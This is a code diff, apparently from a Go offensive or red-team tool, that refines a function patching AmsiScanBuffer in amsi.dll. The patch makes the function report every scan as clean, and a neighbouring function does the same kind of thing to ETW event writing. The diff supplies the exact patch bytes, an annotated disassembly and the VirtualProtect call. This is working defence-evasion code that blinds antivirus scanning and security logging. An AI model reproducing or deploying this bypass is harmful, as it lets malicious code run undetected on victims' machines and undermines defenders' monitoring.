@@ -112,8 +112,18 @@ func PatchETW() error {
 	return windows.VirtualProtect(etwEventWrite.Addr(), uintptr(len(patch)), old, &old)
 }
 
-// PatchAMSI patches AmsiScanBuffer in amsi.dll to always return S_OK
-// with result AMSI_RESULT_CLEAN, bypassing AMSI scanning.
+// PatchAMSI patches AmsiScanBuffer in amsi.dll to write AMSI_RESULT_CLEAN
+// to the result output parameter and return S_OK.
+//
+// AmsiScanBuffer signature (x64):
+//   HRESULT AmsiScanBuffer(rcx, rdx, r8, r9, [rsp+28h], [rsp+30h])
+//   6th param (result ptr) is at [rsp+30h] after the call pushes the return address.
+//
+// Patch disassembly:
+//   48 8B 44 24 30    mov rax, [rsp+30h]   ; load AMSI_RESULT* from 6th param
+//   C7 00 00 00 00 00 mov dword [rax], 0    ; *result = AMSI_RESULT_CLEAN (0)
+//   33 C0             xor eax, eax          ; return S_OK (0)
+//   C3                ret
 func PatchAMSI() error {
 	amsi, err := windows.LoadDLL("amsi.dll")
 	if err != nil {
@@ -123,8 +133,12 @@ func PatchAMSI() error {
 	if err != nil {
 		return err
 	}
-	// xor eax, eax; ret (return 0 = S_OK)
-	patch := []byte{0x33, 0xC0, 0xC3}
+	patch := []byte{
+		0x48, 0x8B, 0x44, 0x24, 0x30, // mov rax, [rsp+30h]
+		0xC7, 0x00, 0x00, 0x00, 0x00, 0x00, // mov dword [rax], 0
+		0x33, 0xC0, // xor eax, eax
+		0xC3, // ret
+	}
 	var old uint32
 	err = windows.VirtualProtect(amsiScanBuffer.Addr(), uintptr(len(patch)), windows.PAGE_EXECUTE_READWRITE, &old)
 	if err != nil {
